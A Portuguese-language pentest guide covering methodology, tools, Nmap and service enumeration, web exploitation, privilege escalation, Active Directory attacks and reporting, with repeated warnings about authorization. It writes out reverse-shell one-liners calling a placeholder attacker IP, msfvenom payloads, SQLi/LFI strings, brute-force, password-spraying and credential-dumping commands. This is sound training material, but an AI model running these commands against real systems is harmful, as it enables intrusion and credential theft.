🎯 Guia Completo de Introdução ao Pentest

Fundamentos, fases padrão, distros, categorias de ferramentas, comandos essenciais e roadmap prático.

Manual Base

01 O que é Pentest & Metodologia Padrão

Teste de Penetração (Penetration Testing): É a simulação autorizada de ataques cibernéticos contra sistemas, redes e aplicações para identificar vulnerabilidades antes que atacantes reais as explorem.

Fases de um Pentest (Metodologia Padrão)

  1. Reconhecimento (Recon): Coleta de informações abrangente do alvo.
  2. Varredura (Scanning): Identificação de serviços ativos, portas e vulnerabilidades.
  3. Exploração (Exploitation): Obtenção do primeiro ponto de acesso (Initial Access).
  4. Pós-exploração (Post-Exploitation): Escalada de privilégio, movimento lateral e coleta de dados sensíveis.
  5. Persistência: Mecanismos para manter o acesso em testes autorizados.
  6. Relatório: Documentação formal dos riscos e propostas de remediação.

Metodologias Reconhecidas no Mercado

  • OWASP Testing Guide (WSTG): Foco específico em aplicações web e APIs.
  • PTES (Penetration Testing Execution Standard): Padrão completo de execução de testes de ponta a ponta.
  • OSSTMM (Open Source Security Testing Methodology Manual): Metodologia científica e métricas de segurança.
  • MITRE ATT&CK: Catálogo taxonômico global de táticas e técnicas de atacantes reais.
Tempo de leitura: ~3 min

02 Sistemas Operacionais para Pentest

Distribuição Principais Características Foco Recomendado
Kali Linux A mais popular do mundo, +600 ferramentas pré-instaladas e enorme comunidade. Padrão da indústria e iniciantes
Parrot OS Mais leve, ambiente ágil com foco reforçado em privacidade, anonimato e forense. Uso diário e máquinas mais modestas

Recomendação Prática: Utilize o Kali Linux em uma máquina virtual (VirtualBox ou VMware Workstation) configurada em rede isolada.

03 Principais Ferramentas por Categoria

  • Reconhecimento / OSINT: Nmap (portas/serviços), theHarvester (e-mails/subdomínios), Maltego (análise visual de relações), Shodan / Censys (mecanismos de busca de dispositivos expostos), Google Dorks, Recon-ng, Amass.
  • Análise de Vulnerabilidades: Nessus (scanner comercial), OpenVAS / Greenbone (open source), Nikto (scanner web), WPScan (auditoria WordPress), Nuclei (scanner ultra rápido baseado em templates YAML).
  • Exploração: Metasploit Framework, searchsploit (busca local Exploit-DB), sqlmap (SQL Injection), Hydra (força bruta online em SSH, FTP, HTTP), John the Ripper / Hashcat (quebra de hashes com GPU), SET (phishing).
  • Web / Proxy: Burp Suite (interceptador e manipulador HTTP), OWASP ZAP (alternativa open source), ffuf / gobuster / dirb (fuzzing de diretórios e parâmetros).
  • Wireless: Aircrack-ng, Wifite, hcxdumptool / hcxtools (captura de handshakes PMKID/WPA).
  • Pós-exploração & Privesc: LinPEAS / WinPEAS, pspy (monitor de processos sem root), BloodHound (Active Directory), Impacket (protocolos Windows via Python), Mimikatz (extração de credenciais LSASS), CrackMapExec / NetExec.
  • Tunneling & Redes: Netcat (nc), chisel / ligolo-ng, Proxychains, Wireshark / tcpdump.
  • Relatórios & Notas: CherryTree / Obsidian (notas estruturadas), Dradis / Faraday, Ghostwriter.
Tempo de leitura: ~5 min

04 Comandos Fundamentais (Linux / Kali)

BASH — Nmap, Recon, Exploração e Shells
# Nmap essenciais
nmap -sV -sC -O alvo.com            # versão, scripts padrão, SO
nmap -p- 192.168.1.10               # todas as 65535 portas
nmap --script vuln alvo.com         # scripts de vulnerabilidade
sudo nmap -sS -Pn -p 80,443 alvo    # SYN scan furtivo

# Recon e enumeração
gobuster dir -u http://alvo.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://alvo.com/FUZZ -w wordlist.txt
amass enum -d alvo.com
enum4linux -a 192.168.1.10

# Exploração e acesso
sqlmap -u "http://alvo.com/item.php?id=1" --dbs --batch
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt rockyou.txt -o saida.txt

# Shells e listener
nc -lvnp 4444                       # listener reverse shell
nc -nlvp 4444 -e /bin/bash          # bind shell

# Upgrade para TTY interativo completo no Linux
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Pressione Ctrl+Z, depois digite:
stty raw -echo; fg
BASH & POWERSHELL — Pós-exploração Rápida
# Linux
sudo -l                  # comandos sudo autorizados
find / -perm -4000 2>/dev/null   # binários SUID
crontab -l               # crontabs do usuário
uname -a                 # versão do kernel

# Windows (PowerShell/CMD)
whoami /priv             # privilégios do token (SeImpersonate etc.)
systeminfo               # versão e arquitetura
net user                 # lista de usuários locais
wmic qfe list            # patches e hotfixes instalados

Exemplo de Port Scanner Básico em Python

PYTHON 3 — Port Scanner com Sockets
import socket

host = "192.168.1.10"
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((host, port)) == 0:
        print(f"[+] Porta {port} aberta")
    s.close()

Plataformas Recomendadas para Prática Legal:

  • TryHackMe: Ideal para iniciantes, trilhas guiadas (comece por Pre Security e Jr Penetration Tester).
  • Hack The Box: Máquinas realistas de nível intermediário a avançado.
  • PortSwigger Web Security Academy: Gratuita, foco em web — a melhor referência prática para uso do Burp Suite.

Certificações Globais Reconhecidas

  • CompTIA Security+ → PenTest+: Base conceitual sólida e valorizada no mercado corporativo.
  • eJPT (INE Security): 100% prática, excelente porta de entrada para auditorias reais.
  • OSCP (OffSec): A certificação prática mais respeitada mundialmente para pentest ofensivo.
  • CEH (EC-Council): Teórica e com forte reconhecimento em triagens de RH.
  • GPEN (GIAC) / OSWE / OSEP: Níveis avançados em web, evasão de defesas e engenharia de exploits.
Tempo de leitura: ~4 min

08 Roadmap Sugerido de 6 a 12 Meses

  • Mês 1–2: Linux básico/avançado, redes fundamentais (TCP/IP, DNS, HTTP/S) e scripts Bash.
  • Mês 2–3: Python voltado para automação e fundamentos de segurança (Security+).
  • Mês 3–5: TryHackMe — trilhas de pentest, Nmap, Metasploit Framework e Burp Suite.
  • Mês 5–7: Web Exploitation na PortSwigger Academy (SQLi, XSS, SSRF, Autenticação).
  • Mês 7–9: Escalação de privilégio (Linux e Windows) e fundamentos práticos de Active Directory.
  • Mês 9–12: Hack The Box ativo, resolução de máquinas intermediárias e realização do eJPT → OSCP.
Tempo de leitura: ~3 min

09 Ética, Legislação & Marco Civil

⚖️ RESPONSABILIDADE JURÍDICA E ESCOPO
Sempre tenha autorização formal por escrito (Regras de Engajamento / Scope Document) antes de iniciar qualquer teste.

No Brasil, o Marco Civil da Internet (Lei 12.965/2014) e o Código Penal (art. 154-A e 154-B — invasão de dispositivo informático) criminalizam o acesso não autorizado. "Estar apenas testando" não anula a ilicitude penal. Pratique unicamente em seus próprios ambientes, labs dedicados ou contratos com escopo estritamente delimitado.
Tempo de leitura: ~3 min
🟡 Pentest — Aprofundamento Técnico & Dicas de Campo

Metodologia profissional, enumeração exaustiva por serviço, exploração web avançada, Active Directory e escrita de relatórios.

Guia de Campo

10 Metodologia Profissional (O que Separa Amadores de Mestres)

  • Documente tudo em tempo real: Comandos, capturas de tela, horários e evidências. Sem print e log, o achado não existe para o cliente. Utilize CherryTree ou Obsidian com uma página dedicada por host.
  • Tenha um checklist por fase: A maioria dos erros de iniciantes é esquecer de testar algo, e não a falta de conhecimento técnico.
  • Aprofunde antes de expandir: Um serviço bem enumerado vale mais que 20 varreduras superficiais. 80% dos pwns derivam de enumeração detalhada.
  • Salve tudo o que você enumera: Versões de serviços, banners e usuários encontrados. O usuário descoberto no recon pode ser a credencial de serviço 3 fases depois.
  • Mantenha listas próprias de credenciais: Senhas corporativas comuns de teste (password123!, P@ssw0rd, empresa@2026) geram sucessos constantes.
  • Cronometre seu tempo: Em exames práticos (OSCP, eJPT), o gerenciamento de tempo é 50% da aprovação. Regra de ouro: se travou numa máquina por 2h sem avanço, troque de alvo e retorne depois.
Tempo de leitura: ~4 min

11 Fase 1 — Reconhecimento Aprofundado (Passivo vs Ativo)

Passivo: Não toca no alvo (Shodan, certificados crt.sh, Google Dorks, Wayback Machine). Sempre execute primeiro.

Ativo: Interage diretamente com o alvo (Nmap, fuzzing de DNS/vhost). Só execute após o passivo.

BASH — Extração de Subdomínios & Nmap com Saída Tripla
# Certificados expõem subdomínios (passivo, ouro puro)
curl -s "https://crt.sh/?q=%25.alvo.com&output=json" | jq -r '.[].name_value' | sort -u

# Varredura completa salvando nos 3 formatos (-oA: normal, greppable e XML)
nmap -sC -sV -p- -oA scan_completo --open -T4 192.168.1.10

# Scan UDP nas portas mais críticas (lento, porém essencial)
sudo nmap -sU --top-ports 50 192.168.1.10

# Scripts de enumeração HTTP para diretórios conhecidos
nmap --script http-enum -p 80,443 alvo.com

Dicas de Ouro: Inspecione sempre robots.txt, sitemap.xml e caminhos /.well-known/. Analise arquivos .js expostos com ferramentas como LinkFinder ou katana para localizar endpoints e chaves de API esquecidas.

Tempo de leitura: ~5 min

12 Fase 2 — Enumeração por Serviço (Cheat Sheet de Campo)

BASH — Cheat Sheet de Serviços SMB, SNMP, LDAP e Web
# SMB (Porta 445)
enum4linux-ng -A 192.168.1.10
smbclient -L //alvo -N                      # listar shares anônimos
smbmap -H alvo -u null                      # permissões de leitura/escrita

# SNMP (Porta 161/UDP) — frequentemente negligenciado
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.10
snmpwalk -v2c -c public 192.168.1.10        # comunidade 'public' entrega processos e usuários

# LDAP (Porta 389)
ldapsearch -x -H ldap://alvo -b "dc=empresa,dc=local" "(objectClass=*)"

# Web (80/443) — Sequência de Ataque:
# 1. Fingerprint de stack com whatweb / wappalyzer
# 2. Navegação com interceptador Burp Suite ligado
# 3. Fuzzing com SecLists
# 4. Dump de repositório .git exposto:
git-dumper http://alvo.com/.git ./dump

# Fuzzing de virtual hosts (filtrando tamanho fixo de resposta de erro -fs):
ffuf -u http://alvo -H "Host: FUZZ.alvo.com" -w subdomains.txt -fs 1532
Tempo de leitura: ~5 min

13 Fase 3 — Exploração Web, Shells & Metasploit

  • SQL Injection: Além de automatizar com sqlmap -r request.txt --dbs, domine a exploração manual (' OR 1=1--, UNION SELECT NULL,NULL,@@version) para ambientes onde payloads automatizados falham por filtros WAF.
  • IDOR / Broken Access Control: A vulnerabilidade mais abundante em auditorias reais. Teste alterar IDs em rotas de API (ex: /api/user/1050 → 1049) entre duas contas autenticadas.
  • File Upload Bypasses: Teste extensões alternativas (.phtml, .php5), dupla extensão (.php.jpg), Content-Type e magic bytes de imagem (cabeçalho GIF89a).
  • SSRF: Teste chamadas internas (http://127.0.0.1:8080) e endpoints de metadados em nuvem (http://169.254.169.254/latest/meta-data/).
  • LFI & Wrappers PHP: Extração de código-fonte via Base64 (php://filter/convert.base64-encode/resource=index.php).
BASH — Reverse Shells & Geração msfvenom
# Bash TCP Reverse Shell
bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1

# Mkfifo Netcat Shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP_ATACANTE 4444 >/tmp/f

# Geração de Payloads com msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o rev.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o rev.exe
Tempo de leitura: ~5 min

14 Fase 4 — Escalação de Privilégios & Active Directory

Checklist Linux (Ordem do simples ao complexo):

  1. sudo -l: Verifique permissões NOPASSWD e consulte imediatamente o GTFOBins.
  2. find / -perm -4000 2>/dev/null: Binários SUID.
  3. Inspecione crontabs editáveis e execute pspy para capturar tarefas invisíveis.
  4. Kernel antigo? uname -a cruzado com DirtyCow / DirtyPipe (CVE-2022-0847).

Checklist Windows:

  • whoami /priv: Se possuir SeImpersonatePrivilege, utilize JuicyPotatoNG / GodPotato para obter SYSTEM.
  • Serviços com caminho sem aspas (Unquoted Service Paths) e diretórios com permissão de escrita.
  • Busque credenciais esquecidas em arquivos sysprep.xml, unattend.xml e histórico do PowerShell (ConsoleHost_history.txt).
BASH — Active Directory com Impacket & BloodHound
# Sem credenciais: AS-REP Roasting
GetNPUsers.py dominio.local/ -usersfile users.txt -no-pass -dc-ip IP

# Com credenciais: Kerberoasting e Coleta BloodHound
GetUsersSPNs.py dominio.local/usuario:senha -dc-ip IP -request
bloodhound-python -u usuario -p senha -d dominio.local -c All -ns IP

# Password Spraying controlado e Dump DCSync (NTDS.dit)
netexec smb IP -u users.txt -p 'Senha@2026' --continue-on-success
secretsdump.py dominio.local/admin:senha@IP
Tempo de leitura: ~5 min

15 Persistência, Pivoting & Ferramentas Modernas (2026)

Pivoting Moderno: Para alcançar redes internas através do host comprometido:

  • ligolo-ng: Túnel reverso baseado em interface TUN local (substituiu o proxychains na prática diária).
  • chisel: Túnel TCP/UDP HTTP rápido via WebSockets.
  • Meterpreter autoroute + módulo socks_proxy.

Ferramentas Modernas de Destaque

  • Nuclei: Scanner baseado em templates comunitários atualizados diariamente para CVEs críticas.
  • NetExec (nxc): Sucessor oficial do CrackMapExec para auditoria de redes Windows/AD.
  • Caido: Alternativa moderna, leve e ágil ao Burp Suite escrita em Rust.
  • Certipy: Auditoria avançada de Active Directory Certificate Services (AD CS / abusos ESC1 a ESC8).
Tempo de leitura: ~4 min

16 Eficiência no Fluxo de Trabalho & Erros a Evitar

BASH — Aliases de Produtividade no Kali (.bashrc)
alias lsn='sudo nc -lvnp 4444'
alias ipa='ip -brief a show eth0 | grep inet'
alias www='python3 -m http.server 80'

Erros Comuns de Iniciantes (Evite a todo custo)

  • Ir direto para o Metasploit/Exploit-DB sem ler o banner exato do serviço.
  • Fuzzing descontrolado sem filtrar por tamanho de resposta (-fs) gerando milhares de falsos positivos.
  • Esquecer de testar portas UDP críticas (161 SNMP, 53 DNS, 69 TFTP) e portas web não-padrão (8080, 8443, 8000, 9000).
  • Não salvar outputs brutos das ferramentas para a confecção posterior do relatório.
Tempo de leitura: ~4 min

17 Estrutura de Relatório Técnico & Executivo

O relatório é o único entregável tangível do pentest. Ele deve conter:

  1. Sumário Executivo: Linguagem de negócios (sem jargões excessivos), visão geral da postura de segurança, gráfico de riscos e nota geral de impacto.
  2. Escopo & Metodologia: Datas de execução, ativos autorizados, regras de engajamento e padrões seguidos (PTES/OWASP).
  3. Achados Técnicos Detalhados: Para cada vulnerabilidade: Título, Severidade (Score CVSS), Descrição técnica, Prova de Conceito (Passo a passo reprodutível com screenshots e comandos), Impacto real no negócio e Recomendação prática de correção.
  4. Anexos: Evidências brutas, logs de varredura e diagramas de rede.
💡 SEVERIDADE NÃO É DIVERSÃO
Um SQL Injection teórico em tabela vazia tem menor valor de negócio que um IDOR simples que expõe o histórico de compras de todos os clientes. Priorize o relatório exatamente como a diretoria do cliente enxerga o risco financeiro e operacional.
Tempo de leitura: ~4 min

🟢 Parte 1 — Fundamentos de Hacking & Pentest

Metodologia padrão, montagem de laboratório, varredura de redes, OWASP Top 10 e comandos essenciais.

Nível Iniciante

01 O que é Hacking & Metodologia de Pentest

Hacking é o processo de explorar sistemas para entender seu funcionamento em profundidade, encontrar falhas e (em contexto ético) corrigi-las. Há três classificações clássicas na comunidade:

  • White Hat: Hackers éticos que atuam sob contrato e autorização explícita.
  • Black Hat: Indivíduos que atuam de forma ilegal ou maliciosa para ganho pessoal/destruição.
  • Gray Hat: Intermediários que operam nas nuances — às vezes pesquisam sistemas sem autorização prévia, porém sem intenção destrutiva, reportando os achados aos responsáveis.

O trabalho do pentester profissional segue um ciclo de metodologia padronizado:

  1. Reconhecimento (Recon): Coleta passiva e ativa de informações sobre o alvo.
  2. Enumeração & Scanning: Mapeamento da superfície de ataque, portas, serviços e versões.
  3. Exploração: Obtenção do primeiro ponto de acesso (Initial Access).
  4. Pós-exploração: Escalação de privilégios (virar root/SYSTEM) e persistência.
  5. Movimentação Lateral & Pivoting: Expandir o alcance na rede interna.
  6. Relatório Técnico & Executivo: Documentar vulnerabilidades, impacto e remediações.
Tempo de leitura: ~3 min

02 Montando seu Laboratório Isolado

⚠️ REGRA DE OURO DA SEGURANÇA
Nunca execute ferramentas de varredura ou exploração contra sistemas reais de terceiros sem autorização prévia por escrito. Pratique exclusivamente dentro do seu ambiente virtualizado.

Para aprender com segurança e sem riscos para sua rede doméstica, monte um ambiente isolado:

  • Virtualizadores: VirtualBox ou VMware Workstation Player (ambos gratuitos).
  • Máquina Atacante: Kali Linux ou Parrot Security OS.
  • Máquinas Alvo Vulneráveis: Metasploitable 2/3, máquinas do VulnHub (ex.: DC-1), DVWA e OWASP Juice Shop.
  • Configuração de Rede: Configure os adaptadores de rede das VMs como Host-Only (Rede Interna) ou NAT Network isolada.
Tempo de leitura: ~3 min

03 Reconhecimento, OSINT & Enumeração com Nmap

OSINT (Open Source Intelligence): Coleta de dados disponíveis publicamente sobre domínios e alvos.

  • theHarvester: Coleta e-mails, nomes de funcionários e subdomínios.
  • shodan.io / censys.io: Mecanismos de busca de dispositivos expostos na internet.
  • Google Dorks: Operadores de busca avançados como site:alvo.com filetype:pdf ou intitle:"index of".
BASH — Comandos Essenciais do Nmap
# Descoberta de hosts ativos na subnet local
nmap -sn 192.168.1.0/24

# Scan completo de todas as 65535 portas com versão (-sV) e scripts (-sC)
nmap -sV -sC -p- -T4 -A 192.168.1.10 -oN scan_completo.txt

# Scan rápido nas top 1000 portas mais comuns
nmap -sT --top-ports 1000 192.168.1.10
Tempo de leitura: ~5 min
